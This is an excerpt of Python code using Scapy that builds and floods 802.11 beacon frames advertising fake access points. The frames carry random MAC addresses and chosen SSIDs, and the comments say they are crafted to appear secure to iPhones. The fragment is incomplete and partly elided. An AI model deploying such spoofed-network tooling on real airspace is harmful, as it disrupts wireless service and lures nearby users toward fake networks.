...
class CreateBeacon:
  ...
  def __init__(self, ssid, number):
    ...
    self.ssid = ssid
    self.number = number
    self.addr = RandMAC() #for random generated mac address
    self.iface = 'wlan0mon'
    ...
    #Beacon layer
    self.beacon = Dot11Beacon(cap='ESS+privacy') # this line assures that iphones see our fake ap's as secure

    #Information Element
    self.essid = Dot11Elt(ID='SSID', info=self.ssid, len=len(self.ssid)) #this assures that our AP's show up as secure and don't get out filtered by some random protocol
    ...
    #all layers stacked
    self.frame = RadioTap()/self.dot11/self.beacon/self.essid/self.rsn  #the beacon frame
  def Send(self):
    sendp(self.frame, inter=0.050, iface=self.iface, loop=1) #sending the beacon frame
  ...
  def MultiProcessSend(self):
    for i in range(self.number):
      ...
      for _ in range(3):    #sending out the same beacon 3 times because for some reason sending only 1 beacon does not always work
        try:
          i = multiprocessing.Process(target=Beacon.Send) #creating a new process
          i.start() #starting the new process
